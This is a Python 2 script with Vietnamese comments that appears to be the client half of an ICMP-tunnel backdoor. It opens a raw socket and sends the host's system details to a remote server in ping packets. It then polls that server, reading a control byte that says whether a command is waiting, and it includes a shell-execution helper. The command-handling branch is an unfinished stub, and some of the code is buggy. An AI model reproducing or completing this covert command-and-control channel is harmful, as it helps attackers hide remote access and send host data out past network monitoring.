# -*- coding: utf-8 -*-

"""
Trong phần này mình sẽ build phần client sẻ gởi gói ICMP ECHO REQUEST

"""
import argparse, subprocess, shlex, threading
import os, sys, socket, struct, select, time, platform

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLAY = 0

default_timer = time.time

def get_ps_name():
    out_put = ""
    user = exec_command("whoami")[0].strip("\n")
    host_name = exec_command("hostname")[0].strip("\n")
    cwd = exec_command("pwd")[0].strip("\n")

    if user == "root":
        out_put = "[" + user + "@" + host_name + " " + cwd + "]" + "#"
    else:
        out_put = "[" + user + "@" + host_name + " " + cwd + "]" + "$"

    return out_put

def exec_command(command):
    cmd_data = ""
    cmd_error = ""
    cmd_status = 0
    try:
        process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE,
                                             stderr=subprocess.STDOUT, shell=True
                                   )

        stdout_data, stderr_data = process.communicate()
        if stderr_data:
            cmd_error = stderr_data
        if stdout_data:
            cmd_data = stdout_data

        cmd_status = process.returncode

    except subprocess.CalledProcessError as err:
        cmd_status = 1
        cmd_err = err.message


    return (cmd_data, cmd_error, cmd_status)

class ICMP():

    @staticmethod
    def checksum(source_string):
        """
        tạo ra check sum cho icmp có độ dài 16 bit,
        Nói chung không cần quan tâm hàm này, nó mục đich để kiểm tra header và data,
        Không cần biết vì biết cũng cã làm gì, hihi
        """
        sum = 0
        countTo = (len(source_string) / 2) * 2
        count = 0
        while count < countTo:
            thisVal = ord(source_string[count + 1]) * 256 + ord(source_string[count])
            sum = sum + thisVal
            sum = sum & 0xffffffff
            count = count + 2

        if countTo < len(source_string):
            sum = sum + ord(source_string[len(source_string) - 1])
            sum = sum & 0xffffffff

        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff

        answer = answer >> 8 | (answer << 8 & 0xff00)

        return answer

    @staticmethod
    def receive_echo_replay(my_socket, victim_ip):

        """
        
        :param my_socket: 
        :param victim_ip: 
        :return: 
        
        {
          "header": <1,2,-1>
          "data": "ddd",
        }
        
        1: khong co command
        2: co command
        -1: loi
        """

        while True:

            # nhận gói echo request
            if my_socket in select.select([my_socket], [], [])[0]:
                buff_packet, addr = my_socket.recvfrom(4096)

                result = {}
                result["header"] = "-1"
                # check ping từ victim gởi

                if addr[0] == victim_ip:
                    icmpHeader = buff_packet[20:28]
                    type, code, checksum, identifier, sequence = struct.unpack(
                        "bbHHh", icmpHeader
                    )

                    if type == 0:
                        header_control = buff_packet[28]
                        data = buff_packet[29:]

                        # nếu gói echo replay từ server với header control là 1 thì không làm gì return thôi
                        if header_control == "1":
                            result["header"] = "1"
                            result["data"] = ""

                        # neu la goi co excute command
                        elif header_control == "2":


                            ## xử lý xyz gì đó


                            data = "<DONGVT>#"
                            #
                            result["header"] = "2"
                            result["data"] = data

                    return result


    @staticmethod
    def send_echo_request(my_socket, dest_addr, identifier, sequence, payload):
        """
        gởi gói ping replay dựa trên gói request
        :param my_socket:
        :param dest_addr:
        :param identifier:
        :param sequence:
        :param cmd:
        :return:
        """

        dest_addr = socket.gethostbyname(dest_addr)

        # Header is type (8 bit), code (8 bit), checksum (16 bit), identifier (16 bit), sequence (16 bit)

        my_checksum = 0


        # Tạo check sum header vào gói replay
        header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, identifier, 1)

        data = payload


        # Tính toán checksum header và data
        my_checksum = ICMP.checksum(header + data)

        # đóng gói lại header ICMP với checksum header
        header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), identifier, 1)

        # gới gói header + data
        my_socket.sendto(header + data, (dest_addr, 1))

def int_get_info():

    """
    
    :return:
    >>.. 
    Python version: ['2.7.10 (default, Feb  7 2017, 00:08:15) ', '[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]']
    dist: ('', '', '')
    system: Darwin
    machine: x86_64
    platform: Darwin-16.6.0-x86_64-i386-64bit
    uname: ('Darwin', 'Dongvt.lan', '16.6.0', 'Darwin Kernel Version 16.6.0: Fri Apr 14 16:21:16 PDT 2017; root:xnu-3789.60.24~6/RELEASE_X86_64', 'x86_64', 'i386')
    version: Darwin Kernel Version 16.6.0: Fri Apr 14 16:21:16 PDT 2017; root:xnu-3789.60.24~6/RELEASE_X86_64
    mac_ver: ('10.12.5', ('', '', ''), 'x86_64')

    """
    data = """
    Python version: %s
    dist: %s
    system: %s
    machine: %s
    platform: %s
    uname: %s
    version: %s
    mac_ver: %s
    """ % (sys.version.split('\n'),str(platform.dist()),platform.system(),platform.machine(),platform.platform(),platform.uname(),platform.version(), platform.mac_ver() )


    return data


def main(ip_server, delay):
    """
    
    :param ip_server: 
    :param delay: 
    :return: 
    """
    sequence = 1
    identifier = os.getpid() & 0xFFFF
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    except socket.error, (errno, msg):
        if errno == 1:
            # permit denny
            msg = msg + (
                " - Note that ICMP messages can only be sent from processes"
                " running as root."
            )
            raise socket.error(msg)
        raise

    # gởi gói thông tin kết nối thành công
    # Gói đầu tiên sẽ gởi toàn bộ thông tin Host
    try:
        ICMP.send_echo_request(my_socket, ip_server, identifier, sequence, "0" + int_get_info())
    except Exception as e:
        print e.message
        ICMP.send_echo_request(my_socket, ip_server, identifier, sequence, "N/A")

    # Nhan goi dau tien
    ICMP.receive_echo_replay(my_socket, ip_server)
    try:
        data = {}
        while 1:

            if data.get("data") != None:
                out = "3" + data["data"]
            else:
                out = "4"
                # goi gơi đi
            ICMP.send_echo_request(my_socket, ip_server, identifier, sequence, out)
            data = ICMP.receive_echo_replay(my_socket, ip_server)
            time.sleep(delay)

            # sequence của gói icmp sẽ tăng dẫn sau mỗi gói
            sequence += 1


    except KeyboardInterrupt:
        print "exit"
        my_socket.close()
        sys.exit(1)

if __name__ == '__main__':

    parse = argparse.ArgumentParser()
    parse.add_argument("--host", help="chọn ip server", required=True)
    parse.add_argument("--delay", help="thời gian delay milliseconds", default=200)
    parse.add_argument("--timeout", help="thời gian delay milliseconds", default=200)
    parse.add_argument("--size", help="maximun data in buffer byte", default=64)
    arg_input = parse.parse_args()
    main(arg_input.host, float(arg_input.delay)/100)